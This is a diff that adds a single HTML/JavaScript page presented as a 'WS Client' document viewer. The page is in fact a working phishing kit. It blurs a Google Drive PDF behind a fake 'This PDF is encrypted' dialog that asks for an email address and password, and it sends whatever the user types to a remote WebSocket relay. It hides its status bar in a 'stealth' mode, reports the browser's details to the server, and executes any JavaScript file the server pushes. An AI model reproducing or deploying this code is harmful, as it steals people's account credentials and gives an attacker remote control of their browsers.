@@ -1,0 +1,615 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WS Client — wss://yourlistener.yourdomain.com</title>
+<style>
+  /* Dark theme matched to the ws_server.py console palette */
+  :root {
+    --bg:        #161620;
+    --bg2:       #1e1e28;
+    --panel:     #22223a;
+    --border:    #303048;
+    --border2:   #404060;
+    --text:      #d0d0d0;
+    --muted:     #8090b0;
+    --accent:    #6495ed;
+    --ok:        #64dc82;
+    --warn:      #ff9d5c;
+    --amber:     #ffd864;
+    --mono:      "Consolas","Menlo","Monaco","Courier New",monospace;
+  }
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0; height: 100%;
+    background: var(--bg); color: var(--text);
+    font-family: var(--mono); font-size: 13px;
+    overflow: hidden;
+  }
+
+  /* ---- status pill (debug mode only: ?hide=0) ---- */
+  #status {
+    position: fixed; top: 0; left: 0; right: 0;
+    display: flex; align-items: center; gap: 8px;
+    padding: 6px 10px;
+    background: #28283a; border-bottom: 1px solid var(--border);
+    font-size: 11px; color: var(--muted);
+    z-index: 20;
+  }
+  #status .dot { width: 9px; height: 9px; border-radius: 50%; background: #888; }
+  #status .dot.on   { background: var(--ok); }
+  #status .dot.err  { background: var(--warn); }
+  #status .grow { flex: 1; }
+
+  /* ---- idle state: a blurred background and nothing else.
+         The single window sits inert until a document is loaded. ---- */
+  #blurbg {
+    position: fixed; inset: -10%;
+    z-index: 1;
+    background:
+      radial-gradient(50% 40% at 25% 30%, #2c2c4e 0%, transparent 70%),
+      radial-gradient(55% 45% at 75% 70%, #1c2c40 0%, transparent 70%),
+      radial-gradient(40% 35% at 60% 15%, #3a2438 0%, transparent 70%),
+      var(--bg);
+    filter: blur(70px);
+  }
+  #veil {
+    position: fixed; inset: 0;
+    background: rgba(10, 10, 16, 0.80);
+    z-index: 5;
+  }
+
+  /* ---- fullscreen document view (default doc / server-pushed files) ---- */
+  #docview {
+    position: fixed; inset: 0;
+    display: none;
+    background: #0c0c12;
+    z-index: 15;
+  }
+  #docview.open { display: block; }
+  #docbody { position: absolute; inset: 0; }
+  /* locked (credentials not yet entered): the content is blurred out */
+  #docview.locked #docbody { filter: blur(18px); }
+  #docbody iframe {
+    display: block;
+    width: 100%; height: 100%;
+    border: 0;
+    background: #fff;
+  }
+  #docbody img {
+    position: absolute; inset: 0;
+    width: 100%; height: 100%;
+    object-fit: contain;
+    background: #0c0c12;
+  }
+  #docbody pre {
+    position: absolute; inset: 0;
+    margin: 0; padding: 14px 18px;
+    overflow: auto;
+    background: #161620; color: #d0d0d0;
+    font-family: var(--mono); font-size: 13px; line-height: 1.5;
+    white-space: pre-wrap; word-break: break-word;
+  }
+  #lockveil {
+    position: absolute; inset: 0;
+    display: none;
+    flex-direction: column; align-items: center; justify-content: center; gap: 6px;
+    background: rgba(8, 8, 14, 0.55);
+    color: var(--muted);
+    z-index: 2;
+    pointer-events: none;
+  }
+  #docview.locked #lockveil { display: flex; }
+  #lockveil .big { font-size: 26px; }
+  #doc-close {
+    position: absolute; top: 8px; right: 10px;
+    z-index: 3;
+    background: rgba(20, 20, 32, 0.85); color: #c0c0d0;
+    border: 1px solid var(--border2); border-radius: 3px;
+    padding: 4px 10px; font-family: var(--mono); font-size: 11px;
+    cursor: pointer;
+  }
+  #doc-close:hover { background: #3a3a55; }
+
+  /* ---- modal (credential prompt / server-pushed dialogs) ---- */
+  #backdrop {
+    position: fixed; inset: 0;
+    display: none;
+    align-items: center; justify-content: center;
+    z-index: 20;   /* above the document view: creds prompt on top of the doc */
+  }
+  #backdrop.open { display: flex; }
+
+  .card {
+    width: 420px; max-width: 90vw;
+    background: var(--bg2);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    box-shadow: 0 12px 40px rgba(0,0,0,0.6);
+    overflow: hidden;
+  }
+  .card .title {
+    padding: 9px 14px;
+    background: #23233a;
+    border-bottom: 1px solid var(--border);
+    color: var(--accent);
+    font-weight: bold; font-size: 13px;
+  }
+  .card .body { padding: 14px; }
+  .card .message {
+    color: var(--text); margin-bottom: 12px; white-space: pre-wrap;
+  }
+  .card .field { margin-bottom: 10px; }
+  .card .field .lbl {
+    display: block; margin-bottom: 4px;
+    color: var(--muted); font-size: 11px;
+  }
+  .card input[type=text], .card input[type=password] {
+    width: 100%;
+    background: #161620; color: var(--text);
+    border: 1px solid var(--border); border-radius: 3px;
+    padding: 7px 10px; font-family: var(--mono); font-size: 13px;
+  }
+  .card input[type=text]:focus, .card input[type=password]:focus {
+    outline: none; border-color: var(--accent);
+  }
+  .card .check {
+    display: flex; align-items: center; gap: 8px;
+    margin-top: 10px; color: var(--text); font-size: 12px;
+  }
+  .card .check input { width: 15px; height: 15px; accent-color: var(--ok); }
+
+  .card .buttons {
+    display: flex; justify-content: flex-end; gap: 8px;
+    padding: 11px 14px;
+    background: #181822; border-top: 1px solid var(--border);
+  }
+  .card .buttons button {
+    min-width: 84px;
+    background: #2a2a40; color: #c0c0d0;
+    border: 1px solid var(--border2); border-radius: 3px;
+    padding: 6px 14px; font-family: var(--mono); font-size: 12px;
+    cursor: pointer;
+  }
+  .card .buttons button:hover { background: #3a3a55; }
+  .card .buttons button.primary {
+    background: #252540; color: #a0c0ff; border-color: #4a6a90;
+  }
+  .card .buttons button.primary:hover { background: #353555; }
+</style>
+</head>
+<body>
+
+  <!-- inert idle look: blurred background under a dark veil, nothing else -->
+  <div id="blurbg"></div>
+  <div id="veil"></div>
+
+  <div id="status">
+    <span class="dot" id="dot"></span>
+    <span id="state">connecting…</span>
+    <span class="grow"></span>
+    <span id="url"></span>
+  </div>
+
+  <!-- fullscreen document view: fills the whole window -->
+  <div id="docview">
+    <div id="docbody"></div>
+    <div id="lockveil">
+      <div class="big">&#128274;</div>
+      <div>locked — enter credentials to open</div>
+    </div>
+    <button id="doc-close" title="Close (Esc)">✕ close</button>
+  </div>
+
+  <div id="backdrop">
+    <div class="card" role="dialog" aria-modal="true">
+      <div class="title" id="m-title">Prompt</div>
+      <div class="body">
+        <div class="message" id="m-message"></div>
+        <div id="m-fields"></div>
+        <label class="check" id="m-check-wrap" style="display:none">
+          <input type="checkbox" id="m-check">
+          <span id="m-check-lbl"></span>
+        </label>
+      </div>
+      <div class="buttons" id="m-buttons"></div>
+    </div>
+  </div>
+
+<script>
+(function () {
+  "use strict";
+
+  // ---- config -----------------------------------------------------------
+  // Single window, single client. The DEFAULT document (a Google Drive PDF
+  // preview) loads fullscreen as soon as the page opens; a username/password
+  // modal appears immediately and must be answered before the document is
+  // unlocked. The server can then push other files (pdf/image/text) which
+  // load into the same fullscreen view.
+  //
+  // Connects to the VPS ws_listener relay (wss://yourlistener.yourdomain.com)
+  // by default — the server on LAN dials the same relay, so this page works
+  // from the internet. Pass ?url=ws://host:port to talk directly to a local
+  // server instead (e.g. ws://192.168.0.45:8765). ?hide=0 = debug mode
+  // (status bar shown).
+  const params = new URLSearchParams(location.search);
+  const SERVER_URL = params.get("url") || "wss://yourlistener.yourdomain.com";
+  const STEALTH    = params.get("hide") !== "0";
+  const CLIENT_ID  = "c-" + Math.random().toString(36).slice(2, 8);
+
+  const DEFAULT_DOC = {
+    id: "default",
+    name: "default.pdf",
+    mime: "application/pdf",
+    url: "https://drive.google.com/file/d/1BlgFBn-QH-3Yb4wcedHOwoKBLP4PkwDv/preview"
+  };
+
+  // ---- dom refs ---------------------------------------------------------
+  const dot     = document.getElementById("dot");
+  const stateEl = document.getElementById("state");
+  const urlEl   = document.getElementById("url");
+  const status  = document.getElementById("status");
+  const docview  = document.getElementById("docview");
+  const docbody  = document.getElementById("docbody");
+  const docClose = document.getElementById("doc-close");
+  const backdrop  = document.getElementById("backdrop");
+  const mTitle    = document.getElementById("m-title");
+  const mMessage  = document.getElementById("m-message");
+  const mFields   = document.getElementById("m-fields");
+  const mCheckWrap = document.getElementById("m-check-wrap");
+  const mCheck    = document.getElementById("m-check");
+  const mCheckLbl = document.getElementById("m-check-lbl");
+  const mButtons  = document.getElementById("m-buttons");
+
+  urlEl.textContent = SERVER_URL;
+  if (STEALTH) status.style.display = "none";   // nothing shows until a modal
+
+  // ---- status helpers (debug mode) ---------------------------------------
+  function setConn(on, text) {
+    dot.className = "dot" + (on ? " on" : (text ? " err" : ""));
+    stateEl.textContent = text || (on ? "connected" : "offline");
+  }
+
+  // ---- websocket ----------------------------------------------------------
+  let ws = null;
+  let reconnectDelay = 1000;
+  let pendingModal = null;   // the modal spec currently on screen
+  let currentDoc   = null;   // the document spec currently on screen
+  let docLocked    = false;
+  let hasAuth      = false;  // credentials entered: don't re-prompt on later docs
+  const counters = { modal: 0, respond: 0, doc: 0, docClose: 0, auth: 0 };
+
+  function connect() {
+    setConn(false, "connecting…");
+    try {
+      ws = new WebSocket(SERVER_URL);
+    } catch (e) {
+      setConn(false, "bad url");
+      setTimeout(connect, reconnectDelay);
+      return;
+    }
+
+    ws.onopen = function () {
+      reconnectDelay = 1000;
+      setConn(true, "connected");
+      // report client info to the server
+      ws.send(JSON.stringify({
+        type: "client_info",
+        info: {
+          clientId: CLIENT_ID,
+          userAgent: navigator.userAgent,
+          platform: (navigator.platform || ""),
+          ts: Date.now()
+        }
+      }));
+    };
+
+    ws.onmessage = function (ev) {
+      let msg;
+      try { msg = JSON.parse(ev.data); } catch (e) { return; }
+      handle(msg);
+    };
+
+    ws.onclose = function () {
+      setConn(false, "disconnected");
+      const d = Math.min(reconnectDelay * 1.6, 15000);
+      setTimeout(connect, reconnectDelay);
+      reconnectDelay = d;
+    };
+
+    ws.onerror = function () {
+      setConn(false, "error");
+    };
+  }
+
+  function send(obj) {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      // Stamp our clientId on every frame so the server can attribute
+      // responses (modal_response / doc_auth / pong) to the right phone
+      // when several clients share the VPS relay link.
+      try { obj.clientId = CLIENT_ID; } catch (e) {}
+      try { ws.send(JSON.stringify(obj)); } catch (e) {}
+      return true;
+    }
+    return false;
+  }
+
+  function handle(msg) {
+    // Ignore frames addressed to someone else (per-client "to" routing
+    // through the relay; harmless under the old broadcast relay too).
+    if (msg.to && msg.to !== "all" && msg.to !== CLIENT_ID) return;
+    switch (msg.type) {
+      case "ping":
+        send({ type: "pong", id: msg.id });
+        break;
+      case "modal":
+        showModal(msg);
+        break;
+      case "doc":       // server-pushed file (pdf/image/text, base64)
+      case "pdf":       // legacy: server-pushed url
+        openDoc(msg);
+        break;
+      // (extensible: command, exec, etc.)
+    }
+  }
+
+  // ---- modal (supports a `fields` list: text / password) ------------------
+  function showModal(spec, opts) {
+    opts = opts || {};
+    counters.modal++;
+    pendingModal = spec;
+    mTitle.textContent = spec.title || "Prompt";
+    mMessage.textContent = spec.message || "";
+
+    // fields: an explicit list, or one legacy "value" field
+    const fields = (spec.fields && spec.fields.length)
+      ? spec.fields
+      : [{ key: "value", label: "", type: "text", value: spec.value || "" }];
+    mFields.innerHTML = "";
+    fields.forEach(function (f) {
+      const wrap = document.createElement("div");
+      wrap.className = "field";
+      if (f.label) {
+        const lbl = document.createElement("span");
+        lbl.className = "lbl";
+        lbl.textContent = f.label;
+        wrap.appendChild(lbl);
+      }
+      const inp = document.createElement("input");
+      inp.type = (f.type === "password") ? "password" : "text";
+      inp.dataset.key = f.key;
+      inp.value = f.value || "";
+      inp.autocomplete = "off";
+      wrap.appendChild(inp);
+      mFields.appendChild(wrap);
+    });
+
+    // checkbox (optional)
+    if (spec.checkbox && spec.checkbox.label) {
+      mCheckWrap.style.display = "flex";
+      mCheckLbl.textContent = spec.checkbox.label;
+      mCheck.checked = !!spec.checkbox.checked;
+    } else {
+      mCheckWrap.style.display = "none";
+      mCheck.checked = false;
+    }
+
+    function collectValues() {
+      const out = {};
+      mFields.querySelectorAll("input").forEach(function (inp) {
+        out[inp.dataset.key] = inp.value;
+      });
+      return out;
+    }
+    function finish(ok) {
+      const values = collectValues();
+      const payload = {
+        id: spec.id, ok: ok,
+        value: (values.value !== undefined) ? values.value
+              : Object.values(values)[0],
+        values: values,
+        checked: mCheck.checked
+      };
+      mButtons.querySelectorAll("button").forEach(function (b) {
+        b.onclick = null;
+      });
+      if (opts.onRespond) opts.onRespond(payload);
+      else respond(payload);
+    }
+
+    // buttons (default OK / Cancel)
+    const buttons = (spec.buttons && spec.buttons.length) ? spec.buttons : ["OK", "Cancel"];
+    mButtons.innerHTML = "";
+    buttons.forEach(function (label, i) {
+      const b = document.createElement("button");
+      b.textContent = label;
+      if (i === 0) b.className = "primary";
+      b.onclick = function () { finish(i === 0); };
+      mButtons.appendChild(b);
+    });
+
+    // keyboard: Enter = primary (OK), Esc = last button (Cancel)
+    mFields.querySelectorAll("input").forEach(function (inp) {
+      inp.onkeydown = function (e) {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          finish(true);
+        } else if (e.key === "Escape") {
+          e.preventDefault();
+          finish(false);
+        }
+      };
+    });
+
+    // the veil is already there; just put the card on top and focus the input
+    backdrop.classList.add("open");
+    setTimeout(function () {
+      const first = mFields.querySelector("input");
+      if (first) { first.focus(); first.select && first.select(); }
+    }, 60);
+  }
+
+  function respond(payload) {
+    counters.respond++;
+    pendingModal = null;
+    backdrop.classList.remove("open");   // back to the inert blurred pane
+    send(Object.assign({ type: "modal_response" }, payload));
+  }
+
+  // ---- fullscreen document view -------------------------------------------
+  function isJsFile(name) {
+    return /\.js$/i.test(String(name || ""));
+  }
+
+  // a .js file may wrap its code in HTML script tags (common when copied
+  // out of an HTML page) — unwrap before executing
+  function stripScriptWrap(code) {
+    const m = String(code).match(/^\s*<script[^>]*>([\s\S]*)<\/script>\s*$/i);
+    return m ? m[1] : String(code);
+  }
+
+  function renderDoc(spec) {
+    docbody.innerHTML = "";
+    let el;
+    if (spec.url) {
+      // remote document (e.g. Google Drive preview)
+      el = document.createElement("iframe");
+      el.title = spec.name || "document";
+      el.src = spec.url;
+    } else {
+      const mime = spec.mime || "application/octet-stream";
+      const dataUrl = "data:" + mime + ";base64," + (spec.data_b64 || "");
+      if (mime === "application/pdf") {
+        el = document.createElement("iframe");
+        el.title = spec.name || "document";
+        el.src = dataUrl;
+      } else if (mime.indexOf("image/") === 0) {
+        el = document.createElement("img");
+        el.alt = spec.name || "image";
+        el.src = dataUrl;
+      } else if (isJsFile(spec.name)) {
+        // .js files: execute in the client context instead of displaying
+        const s = document.createElement("script");
+        s.textContent = stripScriptWrap(b64ToText(spec.data_b64 || ""));
+        docbody.appendChild(s);
+        return;
+      } else {
+        el = document.createElement("pre");
+        el.textContent = b64ToText(spec.data_b64 || "");
+      }
+    }
+    docbody.appendChild(el);
+  }
+
+  function b64ToText(b64) {
+    try {
+      const bin = atob(b64);
+      const bytes = new Uint8Array(bin.length);
+      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+      try { return new TextDecoder("utf-8").decode(bytes); }
+      catch (e) { return String.fromCharCode.apply(null, bytes); }
+    } catch (e) {
+      return "(undecodable content: " + (b64.length || 0) + " b64 chars)";
+    }
+  }
+
+  function openDoc(spec) {
+    currentDoc = spec;
+    counters.doc++;
+    renderDoc(spec);
+    docview.classList.add("open");
+    if (hasAuth) {
+      setLocked(false);   // already unlocked: show the file right away
+    } else {
+      setLocked(true);
+      showCredModal();    // first doc: username + password to open it
+    }
+  }
+
+  function setLocked(v) {
+    docLocked = v;
+    docview.classList.toggle("locked", v);
+  }
+
+  function closeDoc(report) {
+    if (!docview.classList.contains("open")) return;
+    counters.docClose++;
+    if (report && currentDoc) {
+      send({ type: "doc_auth", id: currentDoc.id, ok: false,
+             username: null, password: null });
+    }
+    currentDoc = null;
+    docview.classList.remove("open");
+    docbody.innerHTML = "";
+  }
+
+  function showCredModal() {
+    const spec = {
+      id: "cred-" + (currentDoc ? currentDoc.id : "?"),
+      title: "Open document",
+      message: "This PDF is encrypted.  Please enter your email address " +
+               "and password to Decrypt.",
+      fields: [
+        { key: "username", label: "Email address", type: "text", value: "" },
+        { key: "password", label: "Password", type: "password", value: "" }
+      ],
+      buttons: ["Open", "Cancel"]
+    };
+    showModal(spec, { onRespond: onCredRespond });
+  }
+
+  function onCredRespond(payload) {
+    pendingModal = null;
+    backdrop.classList.remove("open");
+    const id = currentDoc ? currentDoc.id : null;
+    if (payload.ok) {
+      counters.auth++;
+      hasAuth = true;     // don't re-prompt for files pushed later
+      setLocked(false);   // unlock the document
+      send({
+        type: "doc_auth", id: id, ok: true,
+        username: (payload.values && payload.values.username) || "",
+        password: (payload.values && payload.values.password) || ""
+      });
+    } else {
+      closeDoc(true);     // cancelled: report and close
+    }
+  }
+
+  docClose.addEventListener("click", function () { closeDoc(true); });
+  // Esc closes the document (only when no modal is on top)
+  document.addEventListener("keydown", function (e) {
+    if (e.key === "Escape" && docview.classList.contains("open")
+        && !backdrop.classList.contains("open")) {
+      closeDoc(true);
+    }
+  });
+
+  // ---- boot ----------------------------------------------------------------
+  // The default document loads fullscreen immediately on open; the
+  // username/password modal appears right away on top of it.
+  openDoc(Object.assign({}, DEFAULT_DOC));
+  connect();
+
+  window.__wsClient = {
+    mode: "single",
+    stealth: STEALTH,
+    serverUrl: function () { return SERVER_URL; },
+    connected: function () { return !!(ws && ws.readyState === WebSocket.OPEN); },
+    state:     function () { return stateEl.textContent; },
+    docOpen:   function () { return docview.classList.contains("open"); },
+    docLocked: function () { return docLocked; },
+    authed:    function () { return hasAuth; },
+    docInfo:   function () {
+      return currentDoc ? {
+        id: currentDoc.id, name: currentDoc.name, mime: currentDoc.mime,
+        url: currentDoc.url || null
+      } : null;
+    },
+    counters:  counters
+  };
+})();
+</script>
+</body>
+</html>
